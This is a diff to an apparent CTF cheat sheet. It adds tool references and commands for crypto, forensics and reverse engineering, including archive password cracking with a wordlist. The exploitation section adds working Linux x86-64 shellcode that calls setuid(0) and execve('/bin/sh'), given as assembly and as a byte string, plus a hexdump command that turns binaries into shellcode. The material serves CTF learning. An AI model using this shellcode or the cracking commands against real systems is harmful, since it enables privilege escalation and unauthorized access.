@@ -75,6 +75,23 @@ https://yara.readthedocs.io/
 https://regex101.com/
 ```
 
+### 7zipcrack
+
+```bash
+# Install
+https://github.com/cyberblackhole/7zip-crack
+
+# Commands
+7zipcrack file.7z rockyou.txt
+```
+
+### xxd
+
+```bash
+# Commands
+xxd files | cut -d " " -f11 | tr "\n" " " | sed 's/ //g' | sed 's/\.//g' | grep -i "flag"
+```
+
 # CryptoGraphy
 
 ### Online Tools
@@ -89,6 +106,42 @@ https://scwf.dima.ninja/
 ```bash
 => Writeup 
 $ https://github.com/rkm0959/Cryptography_Writeups
+```
+
+### Paillier cryptosystem
+
+```bash
+# References
+$ https://en.wikipedia.org/wiki/Paillier_cryptosystem
+$ https://github.com/GiongfNef/Blog-CTF-2021/blob/master/CTF2021/grabcon-ctf-2021-notrsa.md
+$ https://github.com/p4-team/ctf/tree/master/2018-10-20-hitcon/crypto_paillier
+$ https://ctftime.org/writeup/27171
+```
+
+### Xortool
+
+```bash
+# Install
+$ pip3 install xortool
+
+# Commands
+$ xortool -l 8 -c 00 Encrypted
+$ xortool Encrypted
+
+# References
+$ https://github.com/hellman/xortool
+```
+
+### Xor
+
+```bash
+# Examples
+A = B ^ C
+C = B ^ A
+B = C ^ A
+
+# References
+$ https://github.com/GiongfNef/Blog-CTF-2021/blob/master/CTF2021/cryptohack.md
 ```
 
 ### Vim Decryptor
@@ -299,6 +352,13 @@ for k in range(0,255):
                         print(decrypted)
 ```
 
+### Morse Code
+
+```bash
+# References
+$ https://github.com/GiongfNef/Blog-CTF-2021/blob/master/CTF2021/csawctf-2021.md
+```
+
 
 
 ### Cipher/Encode/Hash
@@ -496,6 +556,85 @@ https://cryptii.com/pipes/polybius-square
 https://www.binaryhexconverter.com/binary-to-decimal-converter
 ```
 
+20. Hexahue Alphabet
+
+![[Pasted image 20211013214113.png]]
+
+```bash
+# References
+https://www.boxentriq.com/code-breaking/hexahue
+```
+
+21. Romans Numbers
+
+```bash
+# Examples
+I , IV, VI
+
+# Script Converting
+def value(r):
+    if (r == 'I'):
+        return 1
+    if (r == 'V'):
+        return 5
+    if (r == 'X'):
+        return 10
+    if (r == 'L'):
+        return 50
+    if (r == 'C'):
+        return 100
+    if (r == 'D'):
+        return 500
+    if (r == 'M'):
+        return 1000
+    return -1
+ 
+ 
+def romanToDecimal(str):
+    res = 0
+    i = 0
+ 
+    while (i < len(str)):
+ 
+        # Getting value of symbol s[i]
+        s1 = value(str[i])
+ 
+        if (i + 1 < len(str)):
+ 
+            # Getting value of symbol s[i + 1]
+            s2 = value(str[i + 1])
+ 
+            # Comparing both values
+            if (s1 >= s2):
+ 
+                # Value of current symbol is greater
+                # or equal to the next symbol
+                res = res + s1
+                i = i + 1
+            else:
+ 
+                # Value of current symbol is greater
+                # or equal to the next symbol
+                res = res + s2 - s1
+                i = i + 2
+        else:
+            res = res + s1
+            i = i + 1
+ 
+    return res
+ 
+ 
+# Driver code
+print("Integer form of Roman Numeral is"),
+inputs = input("Enter Numbers (Romans):" )
+answers = ""
+for i in inputs.split():
+    answers += str(romanToDecimal(i))
+    answers += " "
+
+print(answers)
+```
+
 # Forensics
 
 ### Online Tools
@@ -531,6 +670,7 @@ pip3 install stegoveritas
 stegoveritas_install_deps
 
 # Commands
+stegoveritas allstar.png
 
 ```
 
@@ -761,6 +901,7 @@ testdisk file.img
 binwalk -D="*.*" files.jpeg
 binwalk -D="*.*" files.jpeg
 binwalk -e files.jpeg
+binwalk --dd='.*' music.mp3
 ```
 
 ### Teserract
@@ -799,6 +940,14 @@ gem install zsteg
 # Commands
 ```
 
+### ffmpeg (Extract thumbnail from mp3)
+
+```bash
+# Commands
+ffmpeg -i allstar.mp3 allstar.png 
+``` 
+
+
 # Reverse Engineering
 
 ### CheatSheet
@@ -829,6 +978,29 @@ https://stormctf.ninja/ctf/events/infosecon-2017/competitors-section/spot-flags/
 https://github.com/hasherezade/hollows_hunter/wiki
 ```
 
+### De4dot
+
+```bash
+# Install/Download
+$ https://github.com/Robert-McGinley/de4dot-Installer
+
+# Commands
+$ de4dot -d -r c:\input
+$ de4dot -d file1.dll file2.dll file3.dll
+
+
+# References
+$ https://www.root-me.org/en/Tools/Forensic/de4dot
+```
+
+### Luyten
+
+```bash
+# References
+$ https://github.com/deathmarine/Luyten
+$ https://ctftime.org/writeup/21193
+```
+
 ### GDB 
 
 ```bash
@@ -853,6 +1025,8 @@ step
 next
 info break
 del 1
+goto 0x08049eb9
+
 
 # References
 http://www.gdbtutorial.com/tutorial/how-install-gdb
@@ -860,6 +1034,13 @@ https://gist.github.com/rkubik/b96c23bd8ed58333de37f2b8cd052c30
 http://csapp.cs.cmu.edu/3e/docs/gdbnotes-x86-64.pdf
 https://software.intel.com/content/www/us/en/develop/download/intel-64-and-ia-32-architectures-sdm-combined-volumes-1-2a-2b-2c-2d-3a-3b-3c-3d-and-4.html
 https://suchprogramming.com/debugging-with-gdb-part-3/
+```
+
+### Ida Pro
+
+```bash
+# How to Patch
+$ https://www.youtube.com/watch?v=H8lPDdHLlvQ
 ```
 
 ### VBA Syntax
@@ -1182,6 +1363,42 @@ echo 'AAAA-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-' | ./format
 - https://owasp.org/www-community/attacks/Format_string_attack
 ```
 
+### ShellCode
+
+```bash
+# (1) Linux x86_x64 (bin/sh + setuid(0) + setgid(0))
+# gcc -nostdlib -static shellcode.s -o shellcode.elf
+# objcopy --dump-section .text=shellcode.raw shellcode.elf
+# (cat shellcode.raw;cat) | ./pwn
+# "\x48\x31\xff\x48\xc7\xc0\x69\x00\x00\x00\x0f\x05\x48\x31\xff\x48\xc7\xc0\x6a\x00\x00\x00\x0f\x05\x48\xc7\xc0\x3b\x00\x00\x00\x48\x8d\x3d\x10\x00\x00\x00\x48\xc7\xc6\x00\x00\x00\x00\x48\xc7\xc2\x00\x00\x00\x00\x0f\x05\x2f\x62\x69\x6e\x2f\x73\x68\x00"
+
+.global _start
+start:
+.intel_syntax noprefix
+	xor rdi,rdi		# setuid (0)
+	mov rax, 0x69
+	syscall
+	xor rdi,rdi  		# setgid (0)
+	mov rax, 0x6a
+	syscall
+	mov rax, 59		# this is the syscall number of execve
+	lea rdi, [rip+binsh]	# points the first argument of execve at the first  /bin/sh string below
+	mov rsi,0		# this makes the second argument, argv, NULL
+	mov rdx,0		# this makes the third argument, envp, NULL
+	syscall			# this riggers the system call
+binsh:				# a label marking where /bin/sh string is
+	.string "/bin/sh"
+	
+# (2)
+```
+
+### Convert Binary to ShellCode
+
+```bash
+# Commands
+hexdump -v -e '"\\""x" 1/1 "%02x" ""' shellcode.raw
+``` 
+
 # OSINT
 
 ### OSINT Online Tools
@@ -1196,3 +1413,4 @@ $ https://pimeyes.com/en
 - https://ctftime.org/
 - https://fareedfauzi.github.io/notes/Ctf-Checklist/#
 - https://github.com/RakhithJK/Cyber-Security_Collection
+- https://github.com/sajjadium/ctf-archives
